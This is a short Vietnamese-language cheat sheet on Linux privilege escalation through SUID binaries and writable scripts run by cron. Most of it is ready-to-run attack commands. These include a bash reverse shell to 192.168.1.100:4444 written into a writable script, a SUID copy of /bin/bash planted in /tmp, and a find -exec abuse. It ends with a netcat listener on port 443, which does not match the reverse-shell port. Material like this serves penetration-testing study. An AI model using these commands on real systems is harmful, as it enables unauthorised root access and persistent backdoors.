# SUID Binaries

## Điểm chính khai thác

* Tệp nhị phân hoặc tập lệnh được đặt bit SUID (Set User ID) chạy với quyền của chủ sở hữu (thường là root), cho phép người dùng thực thi lệnh tùy ý với đặc quyền cao.
* Thực thi mã hoặc mở shell với quyền root, dẫn đến nâng quyền từ người dùng thường lên quản trị.
* Chạy tệp nhị phân SUID (ví dụ: find, vim, nano) hoặc tập lệnh được tham chiếu có bit SUID được thiết lập, thường được tìm thấy trong các thư mục như /usr/bin/, /usr/local/bin/.
* Tập lệnh tùy chỉnh có bit SUID, nếu được cấu hình sai, có thể bị lạm dụng để thực thi mã độc.

## Các bước khai thác

### Kiểm tra lỗ hổng

Kiểm tra tệp nhị phân SUID:

```
find / -perm -4000 -type f 2>/dev/null
```

Kiểm tra quyền truy cập tập lệnh/thư mục:

```
find / -writable -type f 2>/dev/null
```

### Thực thi khai thác

Ghi đè tập lệnh có thể ghi:

```
echo '/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' > <file>
```

Tạo shell SUID:

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > <file>
```

Khai thác tệp nhị phân SUID:

```
find . -exec whoami \;
```

**Kích hoạt khai thác**

Chờ cron thực thi tập lệnh để kích hoạt payload:

```
nc -lvnp 443
```
